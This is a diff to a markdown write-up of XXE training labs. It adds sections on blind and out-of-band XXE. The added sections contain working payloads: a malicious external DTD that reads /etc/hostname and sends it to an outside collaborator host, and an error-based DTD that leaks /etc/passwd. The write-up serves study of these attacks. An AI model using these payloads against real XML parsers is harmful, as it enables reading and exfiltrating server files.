@@ -32,6 +32,10 @@ What can we do with XXE-based vulnerabilites:
 - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
 - [Exploiting XInclude to retrieve files](#exploiting-xinclude-to-retrieve-files)
 - [Exploiting XXE via image file upload](#exploiting-xxe-via-image-file-upload)
+- [Blind XXE with out-of-band interaction via XML parameter entities](#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
+- [Blind XXE with out-of-band interaction](#blind-xxe-with-out-of-band-interaction)
+- [Exploiting blind XXE to exfiltrate data using a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
+- [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
 
 # Exploiting XXE using external entities to retrieve files
 
@@ -118,3 +122,81 @@ When checking the avatar on the post, image with file contents should appear.
 ![picture 96](/assets/images/fc2ef080d5dac7ee1a32779ca83d54084849da6c40999cd7f1ccb3148b141721.png)  
 
 Submit hostname as solution in order to solve the lab.
+
+# Blind XXE with out-of-band interaction via XML parameter entities
+
+> This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
+> 
+> To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+
+This lab is all about blind XXE so we won't get any direct response to our payloads.
+
+![picture 0](/assets/images/01dc48997e2ce2be9fcef3eb07ffeea83252de88c9c40903d79b017f740e8ca3.png)  
+
+Callback:
+
+![picture 1](/assets/images/9f750ecd810b5944c400d7fe6e2fca079489b7343e7af36f661f83be63732ced.png)  
+
+Lab has been solved.
+
+# Blind XXE with out-of-band interaction
+> This lab has a "Check stock" feature that parses XML input but does not display the result.
+> 
+> You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
+> 
+> To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+
+To solve this lab, we have to put the DOCTYPE after the xml declaration or else the payload will not work!.
+
+![picture 2](/assets/images/018de34bdf5b9a8e2d0d168116a7bcd947312449e792cd9d92887c96b1fc74f7.png)  
+
+# Exploiting blind XXE to exfiltrate data using a malicious external DTD
+> This lab has a "Check stock" feature that parses XML input but does not display the result.
+To solve the lab, exfiltrate the contents of the /etc/hostname file.
+
+For this lab, the same vulnerability exist in the "Check stock" functionality.
+
+If we try to put entities, we will get an error.
+
+When sending an XML like this, we'll get a callback.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://fyhkrxyhswt25ohovyzz9ovojfp6d11q.oastify.com/test.dtd"> %xxe;]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+Now we need to put test.dtd on our exploit server.
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://g5mlyy5izx03cpop2z60gp2pqgw7k38s.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+If everything has been done right, callback with an hostname should pop in the collaborator.
+
+# Exploiting blind XXE to retrieve data via error messages
+> This lab has a "Check stock" feature that parses XML input but does not display the result.
+> 
+> To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
+> 
+> The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
+
+Same as previous lab, we first can check if we get a callback, which by using following query IS the case.
+
+![picture 3](/assets/images/87e668223f3d8ba52a95feba6400ad3a27489a2b532d4be43d40c4e89aadbcc3.png)  
+
+We'll use following payload on the remote server serving malicious `dtd` file, in order to print the contents of a local file `/etc/passwd`:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+![picture 4](/assets/images/930cb6ce0e05e5eef061ec1bf78d35b6f8937ea3e9c843f92888c36ddc57fb4d.png)  
+
+
